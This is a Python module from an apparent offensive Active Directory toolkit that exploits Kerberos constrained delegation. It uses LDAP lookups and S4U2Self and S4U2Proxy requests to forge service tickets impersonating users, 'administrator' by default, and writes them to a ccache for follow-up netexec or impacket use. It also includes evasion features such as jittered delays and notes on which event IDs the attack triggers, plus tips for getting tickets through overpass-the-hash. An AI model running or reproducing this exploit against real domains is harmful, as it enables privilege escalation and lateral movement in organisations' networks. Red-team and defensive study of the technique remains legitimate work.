"""
modules/constrained.py

Constrained Delegation exploitation module.

Two distinct attack paths based on protocol transition configuration:

PATH A — Protocol Transition Enabled (TRUSTED_TO_AUTH_FOR_DELEGATION)
  The service account can invoke S4U2Self for ANY user without needing
  that user's TGT. This is the most exploitable variant.

  Chain:
    1. Authenticate as the service account
    2. S4U2Self  → forwardable ticket as impersonated user
    3. S4U2Proxy → ticket for target SPN
    4. Write ccache

PATH B — Protocol Transition Disabled
  S4U2Self can only be invoked if the operator already has a TGT or
  service ticket for the target user. The operator must supply a
  valid ccache for the user they want to impersonate.

  Chain:
    1. Authenticate as the service account
    2. S4U2Proxy using the supplied user ccache as evidence
    3. Write ccache

OPSEC profile:
  Events generated:
    4768 — AS-REQ TGT (skipped if ccache supplied)
    4769 — S4U2Self request (PATH A only)
    4769 — S4U2Proxy request (both paths)
  Noise: MEDIUM
  Notes: No LDAP writes required. Lower noise profile than RBCD.
         S4U2Self ticket options are detectable but this is inherent
         to the technique.
"""

import sys
from dataclasses import dataclass, field
from typing import Optional

from core.auth import AuthContext, AuthMethod
from core.ldap import LDAPConnection, OpsecConfig, connect
from core.kerberos import (
    s4u2self, s4u2proxy, full_s4u_chain,
    get_tgt, write_ccache, TicketResult,
)
from utils.output import (
    info, success, warning, error, section, divider,
    print_ticket_result, is_json_mode, print_json,
)
from utils.opsec import OpsecCheck, jittered_sleep, print_operation_noise


# ---------------------------------------------------------------------------
# ConstrainedConfig
# ---------------------------------------------------------------------------

@dataclass
class ConstrainedConfig:
    """
    Configuration for a constrained delegation exploitation run.

    dc_ip:           Domain controller IP
    domain:          Domain FQDN
    service_account: The account with constrained delegation configured
                     (sAMAccountName of svc-mssql, svc-http, etc.)
    target_spn:      The SPN to request a ticket for. Must be in the
                     account's msDS-AllowedToDelegateTo list.
    impersonate:     User to impersonate (PATH A only).
    user_ccache:     Path to a ccache for the target user (PATH B only).
                     Required when protocol transition is not enabled.
    proto_transition: Whether the service account has protocol transition.
                     If None the module will auto-detect from LDAP.
    service_spn:     The SPN of the service account itself (for S4U2Self).
                     If None the module resolves it from LDAP.
    opsec_check:     Prompt before noisy operations.
    delay_ms:        Inter-operation delay in milliseconds.
    jitter_pct:      Jitter percentage for delays.
    output_dir:      Directory for ccache output.
    use_ssl:         Use LDAPS (port 636).
    """
    dc_ip:            str
    domain:           str
    service_account:  str
    target_spn:       str
    impersonate:      str           = "administrator"
    user_ccache:      Optional[str] = None
    proto_transition: Optional[bool] = None
    service_spn:      Optional[str] = None
    opsec_check:      bool          = False
    delay_ms:         int           = 0
    jitter_pct:       int           = 0
    output_dir:       str           = "/tmp"
    use_ssl:          bool          = False


# ---------------------------------------------------------------------------
# LDAP helpers for constrained delegation
# ---------------------------------------------------------------------------

def _resolve_service_account(
    ldap_conn:       LDAPConnection,
    service_account: str,
) -> Optional[dict]:
    """
    Look up the service account and return its attributes including
    userAccountControl and msDS-AllowedToDelegateTo.
    Used to auto-detect protocol transition and validate target SPN.
    """
    results = ldap_conn._query(
        f"(sAMAccountName={service_account})",
        [
            "sAMAccountName",
            "distinguishedName",
            "userAccountControl",
            "msDS-AllowedToDelegateTo",
            "servicePrincipalName",
        ],
    )
    return results[0] if results else None


def _detect_proto_transition(uac_value) -> bool:
    """
    Check if TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000 = 16777216)
    is set in userAccountControl.
    """
    try:
        return bool(int(uac_value) & 16777216) if uac_value else False
    except (TypeError, ValueError):
        return False


def _validate_target_spn(
    allowed_spns,
    target_spn: str,
) -> bool:
    """
    Verify the requested target SPN is in the account's
    msDS-AllowedToDelegateTo list.
    Exits with a clear error if not — attempting S4U2Proxy to an
    SPN not in the delegation list will always fail at the KDC.
    """
    if not allowed_spns:
        return False

    spn_list = (
        allowed_spns if isinstance(allowed_spns, list)
        else [allowed_spns]
    )

    # Normalise for comparison — SPN matching is case-insensitive
    target_lower = target_spn.lower()
    for spn in spn_list:
        if str(spn).lower() == target_lower:
            return True

    return False


def _is_gmsa(account_info: dict) -> bool:
    """
    Return True if the account is a Group Managed Service Account (gMSA).

    gMSAs live under CN=Managed Service Accounts in the directory and have
    objectClass msDS-GroupManagedServiceAccount. They frequently have no
    servicePrincipalName registered even when constrained delegation is
    configured on them, which is the normal pattern — not a misconfiguration.
    """
    dn = str(account_info.get("distinguishedName", ""))
    if "CN=Managed Service Accounts" in dn:
        return True

    obj_class = account_info.get("objectClass")
    if obj_class:
        classes = obj_class if isinstance(obj_class, list) else [obj_class]
        if any("groupmanagedserviceaccount" in str(c).lower() for c in classes):
            return True

    return False


def _resolve_service_spn(
    account_info:    dict,
    service_account: str,
    domain:          str,
) -> tuple[Optional[str], bool]:
    """
    Resolve the SPN to use for S4U2Self from the service account's
    servicePrincipalName attribute.

    For accounts with no registered SPN (most commonly gMSAs), synthesize
    a host/ SPN from the account name and domain. The KDC accepts this for
    S4U2Self because every managed service account and computer object has
    an implicit HOST service class.

    Returns:
        (spn, synthesized) where synthesized=True means no SPN was found
        in LDAP and the value was constructed as a fallback.
    """
    spns = account_info.get("servicePrincipalName")

    if spns:
        spn_list = spns if isinstance(spns, list) else [spns]
        filtered = [s for s in spn_list if s]
        if filtered:
            return str(filtered[0]), False

    # No SPN registered — synthesize host/<name>.<domain>
    # Strip the trailing $ from machine/gMSA account names.
    clean_name = service_account.rstrip("$")
    synthesized = f"host/{clean_name}.{domain}"
    return synthesized, True


# ---------------------------------------------------------------------------
# Path A — Protocol Transition (S4U2Self → S4U2Proxy)
# ---------------------------------------------------------------------------

def _exploit_proto_transition(
    auth:     AuthContext,
    config:   ConstrainedConfig,
    svc_spn:  str,
) -> Optional[TicketResult]:
    """
    Execute PATH A exploitation — S4U2Self followed by S4U2Proxy.

    This path works because the service account can request a service
    ticket for itself on behalf of any user (S4U2Self), then use that
    forwardable ticket to delegate to the target SPN (S4U2Proxy).

    No interaction with the impersonated user's credentials required.
    """
    info(f"Path: Protocol Transition (S4U2Self → S4U2Proxy)")
    info(f"  Service account : {config.service_account}")
    info(f"  Service SPN     : {svc_spn}")
    info(f"  Impersonating   : {config.impersonate}")
    info(f"  Target SPN      : {config.target_spn}")

    if not OpsecCheck(enabled=config.opsec_check).check("s4u2self"):
        return None

    # Step 1 — S4U2Self
    info("Requesting S4U2Self ticket...")
    self_result = s4u2self(
        auth=auth,
        dc_ip=config.dc_ip,
        impersonate=config.impersonate,
        spn=svc_spn,
        output_dir=config.output_dir,
    )
    success("S4U2Self ticket obtained")

    # Inter-operation delay
    if config.delay_ms > 0:
        info(f"Waiting {config.delay_ms}ms before S4U2Proxy...")
        jittered_sleep(config.delay_ms, config.jitter_pct)

    if not OpsecCheck(enabled=config.opsec_check).check("s4u2proxy"):
        return None

    # Step 2 — S4U2Proxy
    info("Requesting S4U2Proxy ticket...")
    proxy_result = s4u2proxy(
        auth=auth,
        dc_ip=config.dc_ip,
        impersonate=config.impersonate,
        target_spn=config.target_spn,
        s4u2self_ticket=self_result.ticket,
        s4u2self_key=self_result.session_key,
        output_dir=config.output_dir,
    )
    success("S4U2Proxy ticket obtained")

    # Step 3 — Write ccache
    write_ccache(proxy_result, config.output_dir)
    return proxy_result


# ---------------------------------------------------------------------------
# Path B — No Protocol Transition (S4U2Proxy with supplied ticket)
# ---------------------------------------------------------------------------

def _exploit_no_proto_transition(
    auth:     AuthContext,
    config:   ConstrainedConfig,
    svc_spn:  str,
) -> Optional[TicketResult]:
    """
    Execute PATH B exploitation — S4U2Proxy using an existing user ticket.

    Without protocol transition, S4U2Self can only produce a non-forwardable
    ticket for arbitrary users. To perform S4U2Proxy the operator must supply
    a valid service ticket for the target user obtained through other means
    (e.g. a ccache from a previous AS-REQ, RC4 overpass-the-hash, etc.)

    The supplied ccache is used as the 'additionalTicket' in the S4U2Proxy
    TGS-REQ, satisfying the KDC's requirement for evidence of the user's
    identity.
    """
    info("Path: No Protocol Transition (S4U2Proxy with user ccache)")
    info(f"  Service account : {config.service_account}")
    info(f"  Target SPN      : {config.target_spn}")

    if not config.user_ccache:
        error(
            f"Service account '{config.service_account}' does not have protocol "
            "transition enabled.\n"
            "  Without protocol transition, a ccache for the target user is required.\n"
            "  Supply it with --user-ccache /path/to/user.ccache\n\n"
            "  To obtain a user ccache you can:\n"
            "    1. Use getTGT.py if you have the user's credentials\n"
            "    2. Use overpass-the-hash if you have their NT hash\n"
            "    3. Capture a ticket via AS-REQ roasting or other means"
        )
        return None

    info(f"  User ccache     : {config.user_ccache}")

    # Load the user's ticket from the supplied ccache
    import os
    if not os.path.isfile(config.user_ccache):
        error(f"User ccache not found: {config.user_ccache}")
        return None

    from impacket.krb5.ccache import CCache
    try:
        user_ccache = CCache.loadFile(config.user_ccache)
    except Exception as e:
        error(f"Failed to load user ccache '{config.user_ccache}': {e}")
        return None

    if not user_ccache.credentials:
        error(f"No credentials found in ccache: {config.user_ccache}")
        return None

    user_ticket  = user_ccache.credentials[0]
    ticket_bytes = user_ticket.ticket.getData()[4:]  # strip 4-byte CountedOctetString length prefix
    ticket_key   = user_ticket.header["key"]["keyvalue"]

    # Extract the impersonated username from the ccache principal
    try:
        impersonate = user_ccache.principal.components[0].decode()
    except Exception:
        impersonate = config.impersonate

    if not OpsecCheck(enabled=config.opsec_check).check("s4u2proxy"):
        return None

    # S4U2Proxy using the supplied user ticket
    info("Requesting S4U2Proxy ticket using supplied user ccache...")
    proxy_result = s4u2proxy(
        auth=auth,
        dc_ip=config.dc_ip,
        impersonate=impersonate,
        target_spn=config.target_spn,
        s4u2self_ticket=ticket_bytes,
        s4u2self_key=ticket_key,
        output_dir=config.output_dir,
    )
    success("S4U2Proxy ticket obtained")

    write_ccache(proxy_result, config.output_dir)
    return proxy_result


# ---------------------------------------------------------------------------
# Main constrained delegation exploitation entry point
# ---------------------------------------------------------------------------

def run_constrained(
    auth:   AuthContext,
    config: ConstrainedConfig,
) -> Optional[TicketResult]:
    """
    Main entry point for the constrained delegation exploitation module.
    Called by delegator.py when `exploit --type constrained` is used.

    Auto-detects protocol transition from LDAP if not specified,
    then routes to the appropriate exploitation path.

    Returns a TicketResult on success, None on failure.
    """
    opsec      = OpsecCheck(enabled=config.opsec_check)
    ldap_opsec = OpsecConfig(delay_ms=config.delay_ms, jitter_pct=config.jitter_pct)

    section("Constrained Delegation Exploitation")
    info(f"Service account  : {config.service_account}")
    info(f"Target SPN       : {config.target_spn}")

    # Step 1 — Connect to LDAP to resolve account details
    info("Connecting to LDAP...")
    try:
        ldap_conn = connect(
            auth=auth,
            dc_ip=config.dc_ip,
            domain=config.domain,
            opsec=ldap_opsec,
            use_ssl=config.use_ssl,
        )
    except SystemExit:
        raise
    except Exception as e:
        error(f"LDAP connection failed: {e}")
        return None

    success(f"Connected as {auth.upn}")

    # Step 2 — Resolve service account attributes
    info(f"Resolving service account '{config.service_account}'...")
    account_info = _resolve_service_account(ldap_conn, config.service_account)

    if not account_info:
        error(
            f"Service account '{config.service_account}' not found in "
            f"{config.domain}.\n"
            "  Verify the account name and domain are correct."
        )
        ldap_conn.close()
        return None

    # Step 3 — Auto-detect protocol transition if not specified
    if config.proto_transition is None:
        uac = account_info.get("userAccountControl")
        proto_trans = _detect_proto_transition(uac)
        info(
            f"Protocol transition: "
            f"{'ENABLED' if proto_trans else 'DISABLED'} (auto-detected)"
        )
    else:
        proto_trans = config.proto_transition
        info(
            f"Protocol transition: "
            f"{'ENABLED' if proto_trans else 'DISABLED'} (specified)"
        )

    # Step 4 — Validate target SPN is in the delegation list
    allowed_spns = account_info.get("msDS-AllowedToDelegateTo")
    if not _validate_target_spn(allowed_spns, config.target_spn):
        spn_list = (
            allowed_spns if isinstance(allowed_spns, list)
            else [allowed_spns] if allowed_spns else []
        )
        error(
            f"Target SPN '{config.target_spn}' is not in "
            f"'{config.service_account}' delegation list.\n"
            f"  Allowed SPNs: {', '.join(str(s) for s in spn_list) or 'none'}\n"
            "  Check the SPN is exact — case-insensitive but must match format."
        )
        ldap_conn.close()
        return None

    success(f"Target SPN validated in delegation list")

    # Step 5 — Resolve service SPN for S4U2Self
    svc_spn = config.service_spn
    synthesized_spn = False
    if not svc_spn:
        svc_spn, synthesized_spn = _resolve_service_spn(
            account_info, config.service_account, config.domain
        )

    if synthesized_spn and proto_trans:
        is_gmsa_account = _is_gmsa(account_info)
        account_type    = "gMSA" if is_gmsa_account else "service account"
        warning(
            f"No servicePrincipalName registered on {account_type} "
            f"'{config.service_account}'.\n"
            f"  Synthesized S4U2Self SPN: {svc_spn}\n"
            "  This is normal for gMSAs with constrained delegation configured.\n"
            "  Override with --service-spn <SPN> if the KDC rejects this."
        )
    elif svc_spn:
        info(f"Service SPN      : {svc_spn}")

    ldap_conn.close()

    # Step 6 — Route to appropriate exploitation path
    if proto_trans:
        ticket_result = _exploit_proto_transition(auth, config, svc_spn)
    else:
        ticket_result = _exploit_no_proto_transition(auth, config, svc_spn or "")

    if not ticket_result:
        return None

    # Step 7 — Print results
    if not is_json_mode():
        delegation_type = (
            "Constrained (Protocol Transition)"
            if proto_trans
            else "Constrained (No Protocol Transition)"
        )
        print_ticket_result(
            ccache_path=ticket_result.ccache_path,
            impersonated_user=config.impersonate,
            target_spn=config.target_spn,
            netexec_cmd=ticket_result.netexec_command,
            impacket_cmd=ticket_result.impacket_command,
            delegation_type=delegation_type,
        )
        print_operation_noise("s4u2self" if proto_trans else "s4u2proxy")
        print_operation_noise("s4u2proxy")
    else:
        print_json({
            "type":             "constrained",
            "proto_transition": proto_trans,
            "service_account":  config.service_account,
            "impersonated":     config.impersonate,
            "target_spn":       config.target_spn,
            "ccache_path":      ticket_result.ccache_path,
            "export_command":   ticket_result.export_command,
            "netexec":          ticket_result.netexec_command,
            "impacket":         ticket_result.impacket_command,
        })

    return ticket_result
